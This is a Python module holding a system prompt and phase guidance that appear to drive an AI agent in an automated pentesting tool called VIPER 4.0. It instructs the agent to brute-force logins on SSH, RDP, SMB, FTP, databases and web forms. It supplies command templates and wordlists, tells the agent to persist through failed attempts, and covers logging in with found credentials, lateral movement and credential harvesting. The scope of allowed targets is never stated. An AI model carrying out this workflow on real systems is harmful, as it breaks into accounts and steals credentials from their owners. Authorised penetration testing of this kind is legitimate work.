#!/usr/bin/env python3
"""
VIPER 4.0 Brute Force / Credential Guess Skill Prompts

System prompt and phase guidance for credential-based attacks.
System prompt and phase guidance for credential-based attacks.
"""

SYSTEM_PROMPT = """\
## ATTACK SKILL: BRUTE FORCE CREDENTIAL GUESS

**This objective has been CLASSIFIED as brute force credential guessing.**
Follow the brute force workflow below. Do NOT switch to other attack methods.

---

## RETRY POLICY

**Maximum wordlist attempts: 3**

If brute force fails with one wordlist strategy, try different wordlists up to 3 times:
- **Attempt 1**: OS/Cloud-aware single username + common passwords
- **Attempt 2**: Comprehensive user list + password list
- **Attempt 3**: Service-specific user:pass combo file

**DO NOT give up after first failure!** Track attempts.

---

## MANDATORY BRUTE FORCE WORKFLOW

### Step 0: Gather Target Context (BEFORE attack)

Check for OS/platform hints:
- Ubuntu, Debian, CentOS, RHEL, Amazon Linux -> Linux variants
- Windows Server, Windows 10/11 -> Windows
- Apache, nginx, OpenSSH -> Service versions may hint at OS

### Step 1: Select Protocol

| Service | Port | Protocol | Notes |
|---------|------|----------|-------|
| SSH | 22 | ssh | Max 4 threads. Most common. |
| FTP | 21 | ftp | |
| Telnet | 23 | telnet | |
| SMB | 445 | smb | Supports DOMAIN\\user syntax |
| RDP | 3389 | rdp | Max 1 thread. Very slow. |
| VNC | 5900 | vnc | Password-only (no username) |
| MySQL | 3306 | mysql | |
| MSSQL | 1433 | mssql | |
| PostgreSQL | 5432 | postgres | |
| MongoDB | 27017 | mongodb | |
| Redis | 6379 | redis | Password-only |
| HTTP Basic | 80/443 | http-get | Append path |
| HTTP POST | 80/443 | http-post-form | Special syntax |
| Tomcat | 8080 | http-get | Path: /manager/html |

**Non-default port:** Use -s PORT flag.
**SSL/TLS:** Use -S flag.

### Step 2: Build and Execute

Each attempt = ONE execution. Build with:
1. Username flags: -l USER (single) or -L FILE (list) or -C FILE (combo)
2. Password flags: -p PASS (single) or -P FILE (list)
3. Target: protocol://IP[:PORT]

#### SSH Templates by Attempt:

**Attempt 1 -- OS-aware single username:**
- Ubuntu: -l ubuntu -P /path/to/passwords.txt -t 4 ssh://target
- Amazon Linux: -l ec2-user -P /path/to/passwords.txt -t 4 ssh://target
- Generic: -l root -P /path/to/passwords.txt -t 4 ssh://target

**Attempt 2 -- Comprehensive lists:**
- -L /path/to/users.txt -P /path/to/passwords.txt -t 4 ssh://target

**Attempt 3 -- Combo file:**
- -C /path/to/ssh_combos.txt -t 4 ssh://target

#### HTTP POST Form (SPECIAL SYNTAX):
```
-l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```
- ^USER^ = username placeholder
- ^PASS^ = password placeholder
- F=string = Failure condition
- S=string = Success condition

### Step 3: Parse Results

| Output Pattern | Meaning |
|---------------|---------|
| [22][ssh] host: x.x.x.x login: root password: toor | SUCCESS |
| 1 valid password found | Confirmation |
| 0 valid passwords found | FAILED -- retry |
| does not support password authentication | Wrong auth method |
| could not connect | Target unreachable |

### Step 4: After Credentials Found

Establish access manually:
| Service | Method |
|---------|--------|
| SSH | ssh user@host with discovered password |
| MySQL | mysql -h host -u user -p'password' |
| FTP | ftp user:password@host |
| SMB | smbclient with credentials |

After establishing access: request phase transition to post_exploitation.

---

## CREDENTIAL REUSE

If credentials found:
1. Report username + password + service
2. Credentials can be used for direct access, lateral movement, pass-the-hash
3. Complete after reporting credentials

---

## AVAILABLE WORDLISTS

### General Purpose
| File | Usage | Description |
|------|-------|-------------|
| unix_users.txt | -L | Common Unix usernames |
| unix_passwords.txt | -P | Common Unix passwords |
| common_roots.txt | -P | Common root passwords |
| keyboard-patterns.txt | -P | Keyboard pattern passwords |

### Service-Specific
| Service | Combo File | Description |
|---------|-----------|-------------|
| SSH | piata_ssh_userpass.txt | SSH user:pass combos |
| HTTP | http_default_userpass.txt | HTTP default combos |
| Tomcat | tomcat_mgr_default_userpass.txt | Tomcat Manager combos |
| PostgreSQL | postgres_default_userpass.txt | PostgreSQL combos |
| VNC | vnc_passwords.txt | VNC passwords (no user) |
"""


def get_phase_guidance(phase: str) -> str:
    """Get phase-specific guidance for brute force attacks."""
    if phase == "informational":
        return """\
## BRUTE FORCE -- INFORMATIONAL PHASE

You are in the informational phase. Focus on:
1. Identifying login services (SSH, FTP, RDP, web forms, databases)
2. Banner grabbing to determine service versions and OS hints
3. Checking for default credentials documentation
4. Building target list of services to attack

Do NOT attempt credential attacks yet."""

    elif phase == "exploitation":
        return """\
## BRUTE FORCE -- EXPLOITATION PHASE

You are in the exploitation phase. Execute the brute force workflow:
1. Select protocol based on identified service
2. Build and execute credential attack (up to 3 attempts with different wordlists)
3. Parse results and establish access if credentials found
4. Request post_exploitation transition after successful authentication

Track attempt count. Do NOT exceed 3 wordlist attempts per service."""

    elif phase == "post_exploitation":
        return """\
## BRUTE FORCE -- POST-EXPLOITATION PHASE

You authenticated via brute-forced credentials. Focus on:
1. Privilege enumeration
2. System information gathering
3. Credential harvesting for lateral movement
4. Evidence collection

The credentials you found may work on other services -- note this for the report."""

    return ""
